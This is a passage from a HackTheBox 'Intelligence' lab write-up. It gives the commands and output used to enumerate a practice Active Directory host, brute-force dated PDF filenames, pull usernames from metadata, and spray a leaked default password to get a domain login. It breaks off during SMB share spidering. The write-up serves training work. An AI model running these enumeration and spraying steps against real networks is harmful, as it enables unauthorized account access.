# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Intelligence](https://www.hackthebox.com/machines/Intelligence)

<img src="https://labs.hackthebox.com/storage/avatars/78c5d8511bae13864c72ba8df1329e8d.png" alt="Intelligence Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟨 Medium

> Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.

#### Skills Required

- Password spraying
- Password cracking
- Basic Active Directory knowledge

#### Skills Learned

- [ADIDNS abuse](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing)
- [ReadGMSAPassword abuse](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)
- [Constrained delegation abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)

#### Tools Used

- bloodhound
- bloodhound-python
- crackmapexec
- dnstool.py (krbrelayx)
- exiftool
- gMSADumper
- gobuster
- impacket-getST
- impacket-psexec
- impacket-wmiexec
- john
- kerbrute
- ldapsearch
- nmap
- nslookup
- pywerview
- responder
- smbclient
- zaproxy

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.16.7  netmask 255.255.254.0  destination 10.10.16.7 ←
        inet6 dead:beef:4::1005  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::f5af:e019:81f6:82c  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.10.248`:
```
10.10.10.248 is alive ←
```

`sudo nmap -Pn -sSV -p- -T5 10.10.10.248`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 16:46 CEST
Nmap scan report for 10.10.10.248
Host is up (0.097s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0 ←
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-24 21:46:54Z) ←
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) ←
445/tcp   open  microsoft-ds? ←
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  unknown
49744/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 498.45 seconds
```

`crackmapexec smb 10.10.10.248`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) ←
```

`crackmapexec smb 10.10.10.248 -u '' -p ''`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\: ←
```

`crackmapexec smb 10.10.10.248 -u '' -p '' --shares`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\:
SMB         10.10.10.248    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED ←
```
❌

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.248`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 16:51 CEST
Nmap scan report for 10.10.10.248
Host is up (0.10s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7 ←
|       forestFunctionality: 7 ←
|       domainControllerFunctionality: 7 ←
|       rootDomainNamingContext: DC=intelligence,DC=htb ←
|       ldapServiceName: intelligence.htb:dc$@INTELLIGENCE.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
|       namingContexts: DC=intelligence,DC=htb
|       namingContexts: CN=Configuration,DC=intelligence,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=intelligence,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=intelligence,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 102517
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
|       dnsHostName: dc.intelligence.htb ←
|       defaultNamingContext: DC=intelligence,DC=htb
|       currentTime: 20241024214445.0Z
|_      configurationNamingContext: CN=Configuration,DC=intelligence,DC=htb
Service Info: Host: DC; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
```

`echo -e '10.10.10.248\tdc.intelligence.htb intelligence.htb' | tee -a /etc/hosts`:
```
10.10.10.248    dc.intelligence.htb intelligence.htb ←
```

`ldapsearch -x -H ldap://10.10.10.248/ -s 'base' 'namingContexts'`:
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=intelligence,DC=htb
namingContexts: CN=Configuration,DC=intelligence,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingContexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingContexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`ldapsearch -x -H ldap://10.10.10.248/ -b "DC=intelligence,DC=htb" '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=intelligence,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
❌

`crackmapexec smb 10.10.10.248 -d 'intelligence.htb' -u '' -p '' --users`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\: 
SMB         10.10.10.248    445    DC               [*] Trying to dump local users with SAMRPC protocol
```
❌

`gobuster dir -u http://10.10.10.248 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.248
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,jpg,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 7432]
/documents            (Status: 301) [Size: 153] [--> http://10.10.10.248/documents/] ←

[...]
```

`zaproxy`

`Sites: http://10.10.10.248` > `<right-click>` > `Attack` > `Spider...` > `Starting Point: http://10.10.10.248`, `Recurse: enabled` > `Start Scan` > `Export` > `./spider.csv`

`cat ./spider.csv`:
```
Processed,Method,URI,Flags
true,GET,http://intelligence.htb,Seed
true,GET,http://intelligence.htb/robots.txt,Seed
true,GET,http://intelligence.htb/sitemap.xml,Seed
true,GET,http://intelligence.htb/,Seed
true,GET,http://intelligence.htb/documents,Seed
true,GET,http://intelligence.htb/documents/2020-01-01-upload.pdf,Seed
true,GET,http://intelligence.htb/documents/2020-12-15-upload.pdf,Seed
false,GET,http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd,Out of Scope
true,GET,http://intelligence.htb/documents/,
true,GET,http://intelligence.htb/documents/favicon.ico,
true,GET,http://intelligence.htb/documents/styles.css,
true,GET,http://intelligence.htb/documents/all.js,
true,GET,http://intelligence.htb/documents/bootstrap.bundle.min.js,
true,GET,http://intelligence.htb/documents/jquery.easing.min.js,
true,GET,http://intelligence.htb/documents/scripts.js,
true,GET,http://intelligence.htb/documents/jquery.min.js,
true,GET,http://intelligence.htb/documents/demo-image-01.jpg,
true,GET,http://intelligence.htb/documents/demo-image-02.jpg,
false,GET,https://startbootstrap.com/theme/grayscale,Out of Scope
false,GET,https://github.com/StartBootstrap/startbootstrap-grayscale/blob/master/LICENSE,Out of Scope
false,GET,https://getbootstrap.com/,Out of Scope
false,GET,https://github.com/twbs/bootstrap/graphs/contributors,Out of Scope
false,GET,https://github.com/twbs/bootstrap/blob/main/LICENSE,Out of Scope
false,GET,https://popper.js.org/,Out of Scope
false,GET,http://www.w3.org/2000/svg,Out of Scope
false,GET,https://fontawesome.com/,Out of Scope
false,GET,https://fontawesome.com/license/free,Out of Scope
```

`cat ./spider.csv | grep "true" | awk -F ',' '{ print $3 }' | sort -u`:
```
http://intelligence.htb
http://intelligence.htb/
http://intelligence.htb/documents
http://intelligence.htb/documents/
http://intelligence.htb/documents/2020-01-01-upload.pdf ←
http://intelligence.htb/documents/2020-12-15-upload.pdf ←
http://intelligence.htb/documents/all.js
http://intelligence.htb/documents/bootstrap.bundle.min.js
http://intelligence.htb/documents/demo-image-01.jpg
http://intelligence.htb/documents/demo-image-02.jpg
http://intelligence.htb/documents/favicon.ico
http://intelligence.htb/documents/jquery.easing.min.js
http://intelligence.htb/documents/jquery.min.js
http://intelligence.htb/documents/scripts.js
http://intelligence.htb/documents/styles.css
http://intelligence.htb/robots.txt
http://intelligence.htb/sitemap.xml
```

`zaproxy`

`Sites: http://10.10.10.248` > `<right-click>` > `Attack` > `Active Scan...` > `Starting Point: http://10.10.10.248`, `Recurse: enabled` > `Start Scan` > `Export` > `./activescan.csv`

`cat ./activescan.csv | grep -v -E '400|401|404|500' | awk -F ',' '{ print $5 }' | sort -u`:
```
http://intelligence.htb/
http://intelligence.htb/documents/all.js
http://intelligence.htb/documents/bg-masthead.jpg
http://intelligence.htb/documents/bg-signup.jpg
http://intelligence.htb/documents/bootstrap.bundle.min.js
http://intelligence.htb/documents/demo-image-01.jpg
http://intelligence.htb/documents/demo-image-02.jpg
http://intelligence.htb/documents/favicon.ico
http://intelligence.htb/documents/jquery.easing.min.js

[...]
```

`wget http://intelligence.htb/documents/2020-01-01-upload.pdf http://intelligence.htb/documents/2020-12-15-upload.pdf`:
```
--2024-10-31 13:23:45--  http://intelligence.htb/documents/2020-01-01-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.10.10.248
Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 (26K) [application/pdf]
Saving to: ‘2020-01-01-upload.pdf’

2020-01-01-upload.pdf                           100%[====================================================================================================>]  26.21K  --.-KB/s    in 0.05s   

2024-10-31 13:23:45 (486 KB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]

--2024-10-31 13:23:45--  http://intelligence.htb/documents/2020-12-15-upload.pdf
Reusing existing connection to intelligence.htb:80.
HTTP request sent, awaiting response... 200 OK
Length: 27242 (27K) [application/pdf]
Saving to: ‘2020-12-15-upload.pdf’

2020-12-15-upload.pdf                           100%[====================================================================================================>]  26.60K  --.-KB/s    in 0.01s   

2024-10-31 13:23:45 (2.30 MB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]

FINISHED --2024-10-31 13:23:45--
Total wall clock time: 0.2s
Downloaded: 2 files, 53K in 0.07s (809 KB/s) ←
```

`file ./*.pdf`:
```
2020-01-01-upload.pdf: PDF document, version 1.5
2020-12-15-upload.pdf: PDF document, version 1.5
```

`exiftool ./*.pdf`:
```
======== ./2020-01-01-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 19:00:00+02:00
File Access Date/Time           : 2024:10:31 13:24:13+01:00
File Inode Change Date/Time     : 2024:10:31 13:23:45+01:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee ←
======== ./2020-12-15-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 19:00:00+02:00
File Access Date/Time           : 2024:10:31 13:24:13+01:00
File Inode Change Date/Time     : 2024:10:31 13:23:45+01:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams ←
```

`echo -e 'William.Lee\nJose.Williams' > ./usernames.txt`

`kerbrute userenum --dc 10.10.10.248 -d 'intelligence.htb' ./usernames.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/31/24 - Ronnie Flathers @ropnop

2024/10/31 13:27:43 >  Using KDC(s):
2024/10/31 13:27:43 >   10.10.10.248:88

2024/10/31 13:27:43 >  [+] VALID USERNAME:       William.Lee@intelligence.htb ←
2024/10/31 13:27:43 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb ←
2024/10/31 13:27:43 >  Done! Tested 2 usernames (2 valid) in 0.065 seconds
```

`for i in $(seq 1035 2130); do date --date="$i day ago" +%Y-%m-%d-upload.pdf; done | tee ./filenames.txt`:
```
2021-12-31-upload.pdf
2021-12-30-upload.pdf
2021-12-29-upload.pdf

[...]

2019-01-03-upload.pdf
2019-01-02-upload.pdf
2019-01-01-upload.pdf
```

`for i in $(cat ./filenames.txt); do wget http://10.10.10.248/documents/$i; done`

`ls -l ./*.pdf`:
```
-rw-rw-r-- 1 kali kali 26835 Apr  1  2021 ./2020-01-01-upload.pdf
-rw-rw-r-- 1 kali kali 27002 Apr  1  2021 ./2020-01-02-upload.pdf
-rw-rw-r-- 1 kali kali 27522 Apr  1  2021 ./2020-01-04-upload.pdf

[...]

-rw-rw-r-- 1 kali kali 26810 Apr  1  2021 ./2021-03-21-upload.pdf
-rw-rw-r-- 1 kali kali 27327 Apr  1  2021 ./2021-03-25-upload.pdf
-rw-rw-r-- 1 kali kali 12127 Apr  1  2021 ./2021-03-27-upload.pdf
```

`exiftool ./*.pdf | grep -i 'creator' | awk -F ': ' '{ print $2 }' | sort -u | tee ./domain_users.txt`:
```
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

`kerbrute userenum --dc 10.10.10.248 -d 'intelligence.htb' ./domain_users.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/31/24 - Ronnie Flathers @ropnop

2024/10/31 13:46:41 >  Using KDC(s):
2024/10/31 13:46:41 >   10.10.10.248:88

2024/10/31 13:46:41 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2024/10/31 13:46:41 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/10/31 13:46:41 >  Done! Tested 30 usernames (30 valid) in 0.159 seconds
```

`for i in $(ls ./*.pdf); do pdftotext $i; done`

`ls -l ./*.txt`:
```
-rw-rw-r-- 1 kali kali       772 Oct 31 13:51 ./2020-01-01-upload.txt
-rw-rw-r-- 1 kali kali      1437 Oct 31 13:51 ./2020-01-02-upload.txt
-rw-rw-r-- 1 kali kali      1083 Oct 31 13:51 ./2020-01-04-upload.txt

[...]

-rw-rw-r-- 1 kali kali      1005 Oct 31 13:51 ./2021-03-21-upload.txt
-rw-rw-r-- 1 kali kali       898 Oct 31 13:51 ./2021-03-25-upload.txt
-rw-rw-r-- 1 kali kali        68 Oct 31 13:51 ./2021-03-27-upload.txt
```

`cat ./*.txt | grep -i 'password' -B5 -A5`:
```
Sit porro tempora porro etincidunt adipisci.


New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876 ←
After logging in please change your password as soon as possible.


Dolor quisquam aliquam amet numquam modi.
Sit porro tempora sit adipisci porro sit quiquia. Ut dolor modi magnam ipsum
velit magnam. Ipsum ut numquam tempora sit. Tempora eius est voluptatem.
Dolorem numquam consectetur etincidunt etincidunt sed. Neque magnam ipsum modi sit aliquam amet. Amet consectetur modi quisquam adipisci aliquam
```

`for i in $(ls ./*.txt); do echo $i; grep 'NewIntelligenceCorpUser9876' $i; done`:
```
[...]

./2020-06-04-upload.txt ←
NewIntelligenceCorpUser9876

[...]
```

`cat ./2020-06-04-upload.txt`:
```
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

`kerbrute passwordspray --dc 10.10.10.248 -d 'intelligence.htb' ./domain_users.txt 'NewIntelligenceCorpUser9876'`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/25/24 - Ronnie Flathers @ropnop

2024/10/25 18:45:54 >  Using KDC(s):
2024/10/25 18:45:54 >   10.10.10.248:88

2024/10/25 18:45:59 >  [+] VALID LOGIN:  Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876 ←
2024/10/25 18:45:59 >  Done! Tested 41 logins (1 successes) in 5.657 seconds
```

`crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 ←
```

`crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --pass-pol`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [+] Dumping password info for domain: intelligence
SMB         10.10.10.248    445    DC               Minimum password length: 7
SMB         10.10.10.248    445    DC               Password history length: None
SMB         10.10.10.248    445    DC               Maximum password age: Not Set
SMB         10.10.10.248    445    DC               
SMB         10.10.10.248    445    DC               Password Complexity Flags: 000000 ←
SMB         10.10.10.248    445    DC                   Domain Refuse Password Change: 0
SMB         10.10.10.248    445    DC                   Domain Password Store Cleartext: 0
SMB         10.10.10.248    445    DC                   Domain Password Lockout Admins: 0
SMB         10.10.10.248    445    DC                   Domain Password No Clear Change: 0
SMB         10.10.10.248    445    DC                   Domain Password No Anon Change: 0
SMB         10.10.10.248    445    DC                   Domain Password Complex: 0
SMB         10.10.10.248    445    DC               
SMB         10.10.10.248    445    DC               Minimum password age: None
SMB         10.10.10.248    445    DC               Reset Account Lockout Counter: None
SMB         10.10.10.248    445    DC               Locked Account Duration: None
SMB         10.10.10.248    445    DC               Account Lockout Threshold: None
SMB         10.10.10.248    445    DC               Forced Log off Time: Not Set
```

`crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [*] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ ←           
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users           READ       
```

`crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares -M spider_plus`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SPIDER_P... 10.10.10.248    445    DC               [*] Started module spidering_plus with the following options:
